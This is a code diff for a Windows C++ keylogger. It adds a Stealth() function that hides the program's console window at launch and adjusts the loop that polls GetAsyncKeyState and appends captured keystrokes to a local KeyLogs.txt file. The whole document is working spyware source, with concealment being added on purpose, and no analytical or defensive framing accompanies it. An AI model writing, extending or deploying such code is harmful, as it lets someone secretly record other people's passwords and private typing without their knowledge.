@@ -12,6 +12,7 @@ void Stealth();
 
 int main()
 {
+	Stealth();
 	char i;
 
 	while (true)
@@ -22,12 +23,13 @@ int main()
 
 			if (GetAsyncKeyState(i) == -32767) //if a Keyboard button is pressed 
 			{
-
+				if (!nonLetterButtons(i))
+				{
 					ofstream logFile;
 					logFile.open("KeyLogs.txt", fstream::app); //opens txt file IF buttons pressed are letters
 					logFile << i;
 					logFile.close();
-		
+				}
 			}
 		}
 	}
@@ -44,10 +46,10 @@ void Save(string text)
 
 }
 
-bool nonLetterButtons(int key)
+bool nonLetterButtons(int vKey)
 {
 
-	switch (key)
+	switch (vKey)
 	{
 
 	case VK_SPACE:
@@ -63,10 +65,19 @@ bool nonLetterButtons(int key)
 		Save(".");
 		break;
 	case VK_BACK:
-		Save("\b");
+		Save(" (backspace) ");
 		break;
 	default:
 		return false; //if button is not any of these options(letters), return false
 
 	}
+}
+
+void Stealth()
+{
+
+	HWND hwnd;
+	AllocConsole();
+	hwnd = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(hwnd, 0);
 }
